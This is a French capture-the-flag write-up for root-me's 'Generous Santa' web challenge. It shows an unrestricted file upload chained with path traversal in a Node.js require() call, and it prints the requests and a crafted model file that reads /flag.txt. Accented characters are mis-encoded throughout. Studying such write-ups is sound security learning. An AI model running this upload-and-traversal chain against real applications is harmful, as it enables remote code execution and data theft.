view: writeup
language: en
seo:
  title: XMAS root-me challenges, Generous Santa
  description:
  keywords: ctf, security, root-me, xmas, web, generous santa, write-up
  author: Antoine Benevaut
  twitter: "@abenevaut"
  og-image: https://www.abenevaut.dev/images/abenevaut-og-xms-2024-root-me.webp
  url: https://www.abenevaut.dev/2024-xmas-root-me/01-web-generous-santa-1.html

writeup: |+
  # Write-up Generous Santa
  
  12h00, 1er d√©cembre 2024, le challenge XMAS de root-me d√©marre avec une √©preuve web "Generous Santa", c'est parti!
  
  Dans le code, on trouve une application web en NodeJS, un Dockerfile (avec un docker-compose), le fichier du flag et un README, qui nous dit:
  
  > The number of Santa's lunti has increased by 1337 this year, and there are a lot of them! Thanks to this, they've been able to give you some very, very nice gifts.
  > If you can't find what you're looking for, you can even suggest gifts to him - maybe they'll make them in time!
  
  Le premier cadeau ayant √©t√© d√©j√† livr√© (ce challenge), allons voir comment on peut encore remplir la hotte du P√®re No√´l.
  
  Je l'ai dit, nous sommes en source ouverte, donc on devrait pouvoir savoir rapidement ou nous allons devoir chercher le flag.
  
  Une petite recherche sur l'ensemble des fichiers du projet avec "flag.txt" nous montre que le flag va √™tre copi√© sur le container Docker √† l'emplacement `/flag.txt`.
  Pour ce qui est des droits, le fichier appartient √† l'utilisateur "santa" qui est aussi l'utilisateur courant.
  
  ```Dockerfile
  COPY flag.txt /flag.txt
  RUN chown santa:santa /flag.txt
  
  USER santa
  ```
  
  On peut aussi noter que c'est l'utilisateur "santa" qui va ex√©cuter l'application node.
  
  ```Dockerfile
  USER santa
  
  CMD ["npm", "start"]
  ```

  Pour le moment, on peut se laisser dire que si on casse l'app node, nous pourrons lire le flag.

  Maintenant, √† quoi ressemlble l'application ?
  
  ![](images/ctf-2024-rootme-xmas/web-generous-santa-1-overview.png)
  
  On a une page d'accueil pour voir les cadeaux et une seconde page avec un formulaire pour sugg√©rer un cadeau.
  Mis √† part la navigation, on trouve sur ces pages deux actions distincts, un bouton pour "ajouter les cadeaux" et un formulaire pour "sugg√©rer un cadeau".
  
  On va donc regarder ce qui se passe lorsque l'on actionne ces deux √©l√©ments. On commence avec la pas d'accueil.
  
  ![](images/ctf-2024-rootme-xmas/web-generous-santa-1-home-query.png)
  
  Au click sur le bouton "Ajouter les cadeaux", l'application fait une requ√™te POST sur `/api/add` avec un payload JSON.
  On reproduit la requ√™te avec ijhttp, dans un fichier `exploit.http`:
  
  > ijhttp est l'outil de jetbrains pour jouer des requ√™tes HTTP. Il est int√©gr√© dans les IDE web de jetbrains.
  > Vous pouvez √©galement l'utiliser en standalone en l'installant via ce [lien](https://www.jetbrains.com/ijhttp/download/#section=zip-archive).  
  
  ```curl
  POST https://day1.challenges.xmas.root-me.org/api/add
  Content-Type: application/json
  
  {"product":"Bugatti"}
  ```
  
  Si on l'ex√©cute, on obtient la r√©ponse suivante:
  
  ```response
  HTTP/2 200 OK
  ...
  
  {
    "success": true,
    "output": {
      "name": "Bugatti",
      "description": "Description of Bugatti",
      "_id": "674c7c4171020c0a249a06e7"
    }
  }
  ```
  
  Soyons taquin, que se passe t'il si on envoie un JSON dans lequel on changerai la valeur de `product` ?
  
  ```curl
  POST https://day1.challenges.xmas.root-me.org/api/add
  Content-Type: application/json
  
  {"product":"Exploit"}
  ```
  
  Si on l'ex√©cute, on obtient la r√©ponse suivante:
  
  ```response
  HTTP/2 500 Internal Server Error
  ...
  
  {
    "message": "Error adding the product Exploit. Cannot find module '../models/exploit'\nRequire stack:\n- /usr/app/routes/hotte.js\n- /usr/app/app.js"
  }
  ```
  
  üéÖHohoho! `Cannot find module '../models/exploit'\nRequire stack:\n- /usr/app/routes/hotte.js` nous indique que l'application cherche un module `../models/exploit` dans le fichier `hotte.js`.
  Surement une piste pour exploiter l'application, une entr√©e ne doit pas √™tre correctement valid√©e. Que nous dit le code ?

  ```javascript
  router.post('/add', async (req, res) => {
    const { product } = req.body;

    try {
        const Gift = require(`../models/${product.toLowerCase()}`);
        const gift = new Gift({ name: product, description: `Description of ${product}` });
        output = gift.store();
        res.json({ success: true, output: output });
    } catch (error) {
        res.status(500).json({ message: `Error adding the product ${product}. ${error.message}` });
    }
  });
  ```
  
  Le code nous dit que l'application va chercher un module dans le dossier `models` avec le nom du produit en minuscule `require(`../models/${product.toLowerCase()}`)`.
  Pas de validation particuli√®re sur le nom du produit, on peut donc envoyer n'importe quoi et l'application va chercher un module avec ce nom.
  Si le module n'existe pas, l'application renvoie une erreur 500 avec le message d'erreur.
  
  Parfait, les requ√™tes et leurs r√©ponses font sens. Si seulement je pouvais envoyer un faux models pour lire le flag...
  
  Alors, que se passe-t-il du c√¥t√© du formulaire de suggestion de cadeau ?
  
  ![](images/ctf-2024-rootme-xmas/web-generous-santa-1-suggest-query.png)
  
  √Ä la soumission du formulaire, l'application fait une requ√™te POST sur `/api/suggest` avec un content type `application/multipart/form-data`.
  On soumet un fichier, tout cela fait donc sens. On notera aussi le nom des champs `name` et `photo`.
  
  On reproduit la requ√™te avec ijhttp, dans notre fichier `exploit.http`.
  On va envoyer notre formulaire avec le champ "name" qui vaut "Nasa" et le champ photo qui est un fichier PNG `nasa.png`.
  
  ```curl
  POST https://day1.challenges.xmas.root-me.org/api/suggest
  Content-Type: multipart/form-data; boundary=WebAppBoundary
  
  --WebAppBoundary
  Content-Disposition: form-data; name="name"
  
  Nasa
  
  --WebAppBoundary
  Content-Disposition: form-data; name="photo"; filename="nasa.png"
  Content-Type: image/png
  
  < ./nasa.png
  
  --WebAppBoundary--
  ```
  
  Status code 200, tout c'est bien pass√©. On obtient la r√©ponse qui suit et on notre attention va se porter sur la valeur de `photoPath`.
  
  ```response
  HTTP/2 200 OK
  ...
  
  {
    "message": "Thank you! Santa will consider your suggestion.",
    "photoPath": "/tmp/2024-12-01_20-27-2/nasa.png"
  }
  ```
  
  üéÖHohoho! `"photoPath": "/tmp/2024-12-01_20-27-2/nasa.png"` nous indique que le fichier a √©t√© upload√© dans le dossier `/tmp/2024-12-01_20-27-2/`.
  
  Si on r√©capitule :
  - nous avons le endpoint `/api/add` qui va chercher un module dans le dossier `models` avec un nom produit qui semble √™tre exploitable
  - nous avons le endpoint `/api/suggest` qui va uploader un fichier dans le dossier `/tmp/2024-12-01_20-27-2/`
  
  √áa sent l'attaque en deux √©tapes! Non ? Plusieurs id√©es viennent alors en t√™te :
  - Est-ce que l'on peut envoyer n'importe quel type de fichier sur le endpoint de suggestion ?
  - Est-ce que l'on peut r√©ussir √† ex√©cuter un "models" truqu√© et avec lire le flag ?
  
  Allez, on s'y colle! On va essayer d'envoyer un fichier `exploit.js` sur le endpoint de suggestion.
  
  Pour cr√©er ce fichier `exploit.js`, on va dupliquer un model existant et adapt√© rapidement le contenu.
  Un copy/paste du fichier bugatti.js puis un find & replace de bugatti en exploit, et on est pas mal pour une premi√®re tentative ?
  
  ```javascript
  const mongoose = require('mongoose');
  
  const exploitSchema = new mongoose.Schema({
    name: { type: String, default: 'exploit' },
    description: { type: String, default: 'A luxury high-performance exploit.' }
  });
    
  exploitSchema.methods.store = function() {
    console.log('exploit stored in the sack.');
    return this;
  };
  
  module.exports = mongoose.model('exploit', exploitSchema);
  ```
  
  On tente d'envoyer notre fichier
  
  ```curl
  POST https://day1.challenges.xmas.root-me.org/api/suggest
  Content-Type: multipart/form-data; boundary=WebAppBoundary
  
  --WebAppBoundary
  Content-Disposition: form-data; name="name"
  
  Nasa
  
  --WebAppBoundary
  Content-Disposition: form-data; name="photo"; filename="exploit.js"
  Content-Type: image/png
  
  < ./exploit.js
  
  --WebAppBoundary--
  ```
  
  > J'ai r√©essay√© ensuite sans le `Content-Type: image/png` et √ßa a fonctionn√©. Z√©ro v√©rification donc. M√™me pas besoin de checker le code, Merci P√®re No√´l!
  
  Et √ßa fonctionne! Notre fichier exploit est upload√© dans le dossier `/tmp/2024-12-01_20-43-18/exploit.js`.
  
  ```reponse
  HTTP/2 200 OK
  ...
  
  {
    "message": "Thank you! Santa will consider your suggestion.",
    "photoPath": "/tmp/2024-12-01_20-43-18/exploit.js"
  }
  ```
  
  Super! On "n'a plus qu'a" trouver un "path traversal" sur le endpoint `/api/add` pour ex√©cuter notre fichier.
  
  > [Path traversal](https://owasp.org/www-community/attacks/Path_Traversal) est une technique qui vise √† utiliser des path non pr√©vu pour acc√©der √† des fichiers ou des r√©pertoires auxquels l'utilisateur peut parfois ne pas avoir acc√®s.
  > Dans notre cas, le endpoint `/api/add` n'a pas vocation √† requ√©rir des fichiers depuis un autre r√©pertoire que le r√©pertoire `src/models` de l'app. 
  
  On va essayer de pas trop t√¢tonner, on r√©capitule les infos utiles :
  - le flag est dans le fichier `/flag.txt`
  - notre exploit est upload√© dans `/tmp/2024-12-01_20-43-18/exploit.js`
  - on va essayer de charger un model et on sait qu'on essaie de le faire avec ce path `../models/${product.toLowerCase()}`
  
  Essayons d'expliciter le path des models, `../models/${product.toLowerCase()}` c'est pas assez clair.
  C'est ou `../models` ?
  
  On sait que le repertoire models est dans le repertoire `src/` du projet. Mais ou est stock√© ce r√©pertoire ?
  
  Dans le Dockerfile, on trouve l'instruction `COPY ./src/ ./` et un peu plus haut l'instruction `WORKDIR /usr/app`.
  Nos sources sont donc localis√©es dans `/usr/app/src/` et les models dans `/usr/app/src/models/`.
  
  üéÑLe sapin s'illumine, pour aller de `models/` √† /tmp/2024-12-01_20-43-18/exploit.js, il nous faut remonter de 4 niveaux.
  On va donc essayer de charger notre exploit avec le path `../../../../tmp/2024-12-01_20-43-18/exploit` (sans l'extension).
  
  Allez! On essaie!
  
  ```curl
  POST https://day1.challenges.xmas.root-me.org/api/add
  Content-Type: application/json
  
  {"product":"../../../../tmp/2024-12-01_20-43-18/exploit"}
  ```
  
  Avant de vous montrez l'exploit final, plusieurs √©tapes on √©t√© n√©cessaires _ainsi que plusieurs essaies_:
  
  Lors du premier essai, une erreur m'est retourn√©e, impossible de trouver le package `mongoose`, une d√©pendance du model incluse via `npm`.
  Pour l'inclure, il a fallu indiquer le path complet vers le package `const mongoose = require('/usr/app/node_modules/mongoose');`.
  
  Au second essai, une nouvelle erreur m'indique que mon model est d√©ja charg√© avec le nom "exploit", c'est tout √† fait normal et relatif au cycle de vie de Express.js.
  L'application node a deux cycles de vie principaux, le premier r√©gie le serveur web (attend une requ√™te) et le second r√©gie l'ex√©cution d'une requ√™te.
  
  L'ex√©cution d'une requ√™te est √©ph√©m√®re, les variables sont d√©truites lorsque la r√©ponse est retourn√©e.
  En revanche, le serveur web est persistant, les variables sont conserv√©es entre les requ√™tes.
  
  Pour corriger le tire, j'ai us√© d'astuce en incr√©mentant simplement le nom du fichier `exploit` √† chaque essai (exploit1, exploit2, exploit3... ü§¶‚Äç‚ôÇÔ∏èvous avez compris).
  
  Enfin, quand j'ai eu un model fonctionnel, j'ai pu ajouter la lecture du flag `fs.readFileSync('/flag.txt')`.

  ```javascript
  const mongoose = require('/usr/app/node_modules/mongoose');
  const fs = require('fs');
  
  const exploit9Schema = new mongoose.Schema({
    name: { type: String, default: 'exploit9' },
    description: { type: String, default: 'A luxury high-performance exploit9.' },
    fileContent: { type: String, default: fs.readFileSync('/flag.txt') }
  });
  
  exploit9Schema.methods.store = function() {
    console.log('exploit9 stored in the sack.');
    
    return this
  };
  
  module.exports = mongoose.model('exploit9', exploit9Schema);
  ```

  üéÅOn envoie notre requ√™te et on obtient le flag üèÅ

  ![](images/ctf-2024-rootme-xmas/web-generous-santa-1-flag.png)

  Cr√©dits du challenge [root-me.org](https://x.com/rootme_org/status/1863296339183796546) et son auteur [Elweth](https://x.com/Elweth_).
  Retrouver aussi les sources du challenge [ici](https://github.com/elweth-sec/Root-Me-XMAS-2024)
  
  [Sommaire >](2024-xmas-root-me.html) - [Challenge suivant >](2024-xmas-root-me/03-web-game-hacking-santa-s-magic-sack-1.html)
